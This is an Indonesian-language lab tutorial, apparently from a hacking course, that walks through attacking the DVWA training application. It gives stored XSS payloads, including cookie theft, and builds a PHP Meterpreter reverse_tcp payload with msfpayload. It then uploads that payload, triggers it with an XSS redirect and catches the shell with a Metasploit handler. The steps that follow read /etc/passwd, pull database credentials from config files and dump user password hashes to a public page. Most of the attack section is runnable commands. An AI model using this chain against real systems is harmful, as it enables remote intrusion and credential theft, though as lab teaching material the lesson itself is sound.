## LESSON 9

Inti dari Lesson 10 adalah mendapatkan 7 hal, yaitu:
1. Test **Basic Cross Site Scripting (XSS)** attack
2. Test **Iframe Cross Site Scripting (XSS)** attack
3. Test **Cookie Cross Site Scripting (XSS)** attack
4. Membuat **php/meterpreter/reverse_tcp payload**
5. Menjalankan **php/meterpreter/reverse_tcp listener**
6. Mengunggah **PHP paload** lewat **DVWA Upload Screen**
7. Test **PHP Payload** menggunakan **Cross Site Scripting (XSS) attack**

**NOTE**
- IP yang digunakan adalah sesuai dengan IP tempat DVWA ter-deploy

### Langkah-langkah

**A. Fix Stored Cross Site Scripting (XSS)**
1. Masukkan command

```
cd /var/www/html/dvwa/vulnerabilities/xss_s/
nano index.php
```

![SS 1](LESSON_9/1.png)

2. Mengganti panjang **mtxMessage** menjadi **250** di dalam **index.php**

![SS 2](LESSON_9/2.png)

**B. Enable Javascript**
1. Masuk ke **Firefox**, klik **Edit** -> **Preferences* -> **Content**, Centang **Block pop-up Windows** dan **Enable JavaScript**

![SS 3](LESSON_9/3.png)

**C. XSS Stored Basic Exploit Test**
1. Pilih menu **XSS Stored**, lalu isi **Name** dengan **Test 1** dan **Message** dengan

```
<script>alert("This is a XSS Exploit Test")</script>
```

![SS 4](LESSON_9/4.png)

Lalu

![SS 5](LESSON_9/5.png)

Hasil

![SS 6](LESSON_9/6.png)

**D. XSS Stored IFRAME Exploit Test**
1. Pilih **Setup** lalu klik **Create / Reset Database Button**

![SS 7](LESSON_9/7.png)

Hasil

![SS 8](LESSON_9/8.png)

2. Pilih **XSS Stored**, lalu isi **Name** dengan **Test 2** dan **Message** dengan

```
<iframe src="http://www.cnn.com"></iframe>
```

![SS 9](LESSON_9/9.png)

Hasil

![SS 10](LESSON_9/10.png)

**E. XSS Stored COOKIE Exploit Test**
1. Pilih **Setup** lalu klik **Create / Reset Database Button**

![SS 11](LESSON_9/11.png)

2. Pilih **XSS Stored**, lalu isi **Name** dengan **Test 3** dan **Message** dengan

```
<script>alert(document.cookie)</script>
```

![SS 12](LESSON_9/12.png)

Hasil

![SS 13](LESSON_9/13.png)

**F. Build PHP msfpayload**
1. Masukkan command ini

```
msfpayload php/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=4444 R > FORUM_BUG.php
```

![SS 14](LESSON_9/14.png)

2. **Edit** **FORUM_BUG.php**

![SS 15](LESSON_9/15.png)

**G. Upload PHP Payload**
1. Pilih **Upload** dan pilih **FORUM_BUG.php**

![SS 16](LESSON_9/16.png)

Hasil

![SS 17](LESSON_9/17.png)

2. Jalankan **PHP Listener**

```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 192.168.1.104
set LPORT 4444
exploit
```

![SS 18](LESSON_9/18.png)

**H. XSS Stored window.location Exploit Test**
1. Pilih **Setup** pada DVWA dan klik **Create / Reset Database Button**

2. Pilih **XSS Stored** pada DVWA dan isi **Name** dengan **Test 4** dan **Message** dengan

```
<script>window.location="http://192.168.1.103/dvwa/hackable/uploads/FORUM_BUG.php" </script>
```

![SS 19](LESSON_9/19.png)

Hasil

![SS 20](LESSON_9/20.png)

**NOTE**
- Terdapat icon **Connecting**

**I. View Metasploit Session**
1. **Backtrack** mendapatkan jawaban

![SS 21](LESSON_9/21.png)

2. Melakukan koneksi **Shell**

```
shell
tail /etc/passwd
```

![SS 22](LESSON_9/22.png)

3. Mencari **File Konfigurasi**

```
whoami
grep apache /etc/passwd
find /var/www/* -print | grep config
```

![SS 23](LESSON_9/23.png)

4. Exploit **File Konfigurasi**

```
grep "db_" /var/www/html/dvwa/config/config.inc.php
echo "use dvwa; show tables;" | mysql -uroot -psanisani
echo "use dvwa; desc users;" | mysql -uroot -psanisani
echo "select user,password from dvwa.users;" | mysql -uroot -psanisani
```

![SS 24](LESSON_9/24.png)

![SS 25](LESSON_9/25.png)

```
echo "<pre>" >> /var/www/html/dvwa/hackable/uploads/xss.html
echo "select user,password from dvwa.users;" | mysql -uroot -pdvwaPASSWORD >> /var/www/html/dvwa/hackable/uploads/xss.html
echo "</pre>" >> /var/www/html/dvwa/hackable/uploads/xss.html
echo "<br>Your Name<br>" >> /var/www/html/dvwa/hackable/uploads/xss.html
date >> /var/www/html/dvwa/hackable/uploads/xss.html
```

![SS 26](LESSON_9/26.png)

**J. Testing**
1. Akses halaman
```
http://192.168.1.103/dvwa/hackable/uploads/xss.html
```

![SS 27](LESSON_9/27.png)

### Kesimpulan Lesson 9

Menggunakan **XSS** dapat mengetahui konten dari **Database**
